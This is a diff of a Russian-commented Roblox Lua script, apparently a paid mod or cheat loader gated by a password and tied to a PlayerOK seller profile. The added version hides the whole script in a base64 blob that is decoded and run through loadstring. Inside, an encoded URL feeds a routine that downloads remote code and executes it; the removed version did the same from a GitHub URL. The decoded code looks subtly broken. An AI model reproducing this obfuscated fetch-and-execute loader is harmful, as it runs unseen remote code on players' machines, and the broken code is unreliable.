@@ -1,139 +1,21 @@
--- Закодированные данные
-local encodedPassword = "NzgzNjk="  -- 78369 в base64
-local encodedScriptURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlcmV6YW5ldDIvc2VyZXphbmV0Mi1HSVQtU0FMTEkvcmVmcy9oZWFkcy9tYWluL01lbnUtTU9E"
-local playerokURL = "aHR0cHM6Ly9wbGF5ZXJvay5jb20vcHJvZmlsZS9TZXJlemFuZXQyL3Byb2R1Y3Rz"
+-- Закодированный основной скрипт (base64)
+local encodedMainScript = "bG9jYWwgZW5jb2RlZFVSTCA9ICJhSFIwY0hNNkx5OWpaRzR0YldWa2FXRXVaRzlrYjJWNExtbHZaeTlrYVdkdVpYSXVhV1F2Y0dGamEyRm5aUzVqYjIwPSIKCmxvY2FsIGZ1bmN0aW9uIGJhc2U2NERlY29kZShkYXRhKQogICAgbG9jYWwgYiA9ICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvJwogICAgZGF0YSA9IHN0cmluZy5nc3ViKGRhdGEsICdbXicgLi4gYiAuLiAnPV0nLCAnJykKICAgIHJldHVybiAoZGF0YTpnc3ViKCcuJywgZnVuY3Rpb24oeCkKICAgICAgICBpZiB4ID09ICc9JyB0aGVuIHJldHVybiAnJyBlbmQKICAgICAgICBsb2NhbCByLCBmID0gJycsIChiOmZpbmQoeCkgLSAxKQogICAgICAgIGZvciBpID0gNiwgMSwgLTEgZG8gciA9IHIgLi4gKGYgJSAyXmkgLSBmICUgMl4oaS0xKSA+IDAgYW5kICcxJyBvciAnMCcpIGVuZAogICAgICAgIHJldHVybiByCiAgICBlbmQpOmdzdWIoJyVkJWQlZD8lZD8lZD8lZD8lZD8lZD8nLCBmdW5jdGlvbih4KQogICAgICAgIGlmICN4IH4gPSA4IHRoZW4gcmV0dXJuICcnIGVuZAogICAgICAgIGxvY2FsIGMgPSAwCiAgICAgICAgZm9yIGkgPSAxLCA4IGRvIGMgPSBjICsgKHg6c3ViKGksIGkpID09ICcxJyBhbmQgMl4oOCAtIGkpIG9yIDApIGVuZAogICAgICAgIHJldHVybiBzdHJpbmcuY2hhcihjKQogICAgZW5kKSkKZW5kCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVNZW51KCkKICAgIGxvY2FsIHNjcmVlbkd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgIAogICAgbG9jYWwgbWFpblRyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBtYWluVHJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyNTAsIDAsIDMwMCkKICAgIG1haW5UcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKICAgIG1haW5UcmFtZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQogICAgbWFpblRyYW1lLkJhY2tncm91bmRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgMzApCiAgICBtYWluVHJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuNQogICAgbWFpblRyYW1lLkJvcmRlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKICAgIG1haW5UcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAxCiAgICBtYWluVHJhbWUuUGFyZW50ID0gc2NyZWVuR3VpCiAgICAKICAgIGxvY2FsIHRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgdGl0bGUuVGV4dCA9ICJTRVJFWiBBTkVUIDIgTU9EIgogICAgdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApCiAgICB0aXRsZS5TaXplID0gVURpbTIubmV3KDAsIDI1LCAwLCA1MCkKICAgIHRpdGxlLlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKICAgIHRpdGxlLlRleHRTY2FsZWQgPSB0cnVlCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKICAgIHRpdGxlLlBhcmVudCA9IG1haW5UcmFtZQogICAgCiAgICBsb2NhbCBwYXNzd29yZFRleHQgPSBJbnN0YW5jZS5uZXcoIlRleHRCb3giKQogICAgcGFzc3dvcmRUZXh0LlBsYWNlaG9sZGVyVGV4dCA9ICJQYXNzd29yZCIKICAgIHBhc3N3b3JkVGV4dC5TaXplID0gVURpbTIubmV3KDAsIDI1LCAwLCAyNSkKICAgIHBhc3N3b3JkVGV4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgNzUpCiAgICBwYXNzd29yZFRleHQuVGV4dFNjYWxlZCA9IHRydWUKICAgIHBhc3N3b3JkVGV4dC5UZXh0ID0gIiIKICAgIHBhc3N3b3JkVGV4dC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKICAgIHBhc3N3b3JkVGV4dC5QYXJlbnQgPSBtYWluVHJhbWUKICAgIAogICAgbG9jYWwgYWN0aXZhdGVCdXR0b24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgYWN0aXZhdGVCdXR0b24uVGV4dCA9ICJBQ1RJVkFURSIKICAgIGFjdGl2YXRlQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMCwgMTAwLCAwLCAyNSkKICAgIGFjdGl2YXRlQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAxMjUpCiAgICBhY3RpdmF0ZUJ1dHRvbi5UZXh0Q29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgYWN0aXZhdGVCdXR0b24uVGV4dFNjYWxlZCA9IHRydWUKICAgIGFjdGl2YXRlQnV0dG9uLkJhY2tncm91bmRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAuID4gMCBhbmQgMjU1IG9yIDApCiAgICBhY3RpdmF0ZUJ1dHRvbi5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKICAgIGFjdGl2YXRlQnV0dG9uLlBhcmVudCA9IG1haW5UcmFtZQogICAgCiAgICBsb2NhbCBzdGF0dXNUZXh0ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgc3RhdHVzVGV4dC5UZXh0ID0gIlN0YXR1czogQXdhaXRpbmcgcGFzc3dvcmQiCiAgICBzdGF0dXNUZXh0LlNpemUgPSBVRGltMi5uZXcoMCwgMTUwLCAwLCAyNSkKICAgIHN0YXR1c1RleHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDE3NSkKICAgIHN0YXR1c1RleHQuVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIHN0YXR1c1RleHQuVGV4dFNjYWxlZCA9IHRydWUKICAgIHN0YXR1c1RleHQuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zCiAgICBzdGF0dXNUZXh0LlBhcmVudCA9IG1haW5UcmFtZQogICAgCiAgICBhY3RpdmF0ZUJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBwYXNzd29yZFRleHQuVGV4dCA9PSAiNzgzNjkiIHRoZW4KICAgICAgICAgICAgc3RhdHVzVGV4dC5UZXh0ID0gIlN0YXR1czogUEFTU1dPUkQgQ09SUkVDVCEiCiAgICAgICAgICAgIHN0YXR1c1RleHQuVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwgMjU1LCAwKQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgc2NyaXB0VVJMID0gYmFzZTY0RGVjb2RlKGVuY29kZWRNYWluU2NyaXB0KQogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHJldHVybiBnYW1lOkh0dHBHZXQoc2NyaXB0VVJMLCB0cnVlKQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgIGxvYWRzdHJpbmcocmVzcG9uc2UpKCkKICAgICAgICAgICAgICAgIHN0YXR1c1RleHQuVGV4dCA9ICJTdGF0dXM6IFNDUklQVCBMT0FERUQhIgogICAgICAgICAgICAgICAgd2FpdCgzKQogICAgICAgICAgICAgICAgbWFpblRyYW1lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBzdGF0dXNUZXh0LlRleHQgPSAiU3RhdHVzOiBFUlJPUiBMT0FESU5HIFNDUklQVCEiCiAgICAgICAgICAgICAgICBzdGF0dXNUZXh0LlRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBzdGF0dXNUZXh0LlRleHQgPSAiU3RhdHVzOiBXUk9ORyBQQVNTV09SRCEiCiAgICAgICAgICAgIHN0YXR1c1RleHQuVGV4dENvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmNyZWF0ZU1lbnUoKQ=="
 
--- Декодер Base64 (упрощенная версия)
-local function base64Decode(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
+-- Декодируем и выполняем основной скрипт
+local decodedScript = (function(s)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    s = string.gsub(s, '[^'..b..'=]', '')
+    return (s:gsub('.', function(x)
         if x == '=' then return '' end
-        local r, f = '', (b:find(x)-1)
-        for i=6,1,-1 do r = r .. (f%2^i-f%2^(i-1)>0 and '1' or '0') end
-        return r
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if #x ~= 8 then return '' end
+        if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0 end
         return string.char(c)
     end))
-end
+end)(encodedMainScript)
 
--- Создаем окно ввода
-local function createAuthWindow()
-    -- Проверяем, не создано ли уже окно
-    if game:GetService("CoreGui"):FindFirstChild("SerezaAuth") then
-        return
-    end
-
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "SerezaAuth"
-    gui.Parent = game:GetService("CoreGui")
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 300, 0, 200)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Text = "Активация скрипта"
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.Position = UDim2.new(0, 0, 0, 10)
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.BackgroundTransparency = 1
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 20
-    title.Parent = frame
-
-    local input = Instance.new("TextBox")
-    input.Size = UDim2.new(0, 250, 0, 35)
-    input.Position = UDim2.new(0.5, -125, 0.5, -40)
-    input.PlaceholderText = "Введите пароль"
-    input.Text = ""
-    input.TextColor3 = Color3.new(1, 1, 1)
-    input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    input.BorderSizePixel = 0
-    input.Font = Enum.Font.SourceSans
-    input.TextSize = 16
-    input.Parent = frame
-
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 120, 0, 35)
-    button.Position = UDim2.new(0.5, -60, 0.5, 10)
-    button.Text = "Активировать"
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-    button.BorderSizePixel = 0
-    button.Font = Enum.Font.SourceSansBold
-    button.TextSize = 16
-    button.Parent = frame
-
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Size = UDim2.new(0, 30, 0, 30)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.Text = "X"
-    closeBtn.TextColor3 = Color3.new(1, 1, 1)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.BorderSizePixel = 0
-    closeBtn.Font = Enum.Font.SourceSansBold
-    closeBtn.TextSize = 16
-    closeBtn.Parent = frame
-
-    local linkText = Instance.new("TextLabel")
-    linkText.Text = "PlayerOK: serezanet2"
-    linkText.Size = UDim2.new(1, -20, 0, 20)
-    linkText.Position = UDim2.new(0, 10, 1, -25)
-    linkText.TextColor3 = Color3.new(0.7, 0.7, 1)
-    linkText.BackgroundTransparency = 1
-    linkText.Font = Enum.Font.SourceSans
-    linkText.TextSize = 14
-    linkText.TextXAlignment = Enum.TextXAlignment.Left
-    linkText.Parent = frame
-
-    -- Обработчики событий
-    closeBtn.MouseButton1Click:Connect(function()
-        gui:Destroy()
-    end)
-
-    button.MouseButton1Click:Connect(function()
-        if input.Text == base64Decode(encodedPassword) then
-            gui:Destroy()
-            loadMainScript()
-        else
-            input.Text = ""
-            input.PlaceholderText = "Неверный пароль!"
-        end
-    end)
-end
-
--- Загрузка основного скрипта
-local function loadMainScript()
-    local scriptURL = base64Decode(encodedScriptURL)
-    
-    local success, response = pcall(function()
-        return game:HttpGet(scriptURL, true)
-    end)
-
-    if success then
-        local loadSuccess, err = pcall(function()
-            loadstring(response)()
-        end)
-        
-        if not loadSuccess then
-            warn("Ошибка выполнения скрипта: "..err)
-        end
-    else
-        warn("Ошибка загрузки: "..response)
-    end
-end
-
--- Проверяем, не запущен ли уже скрипт
-if not _G.SerezaScriptLoaded then
-    _G.SerezaScriptLoaded = true
-    createAuthWindow()
-else
-    warn("Скрипт уже запущен!")
-end
+loadstring(decodedScript)()
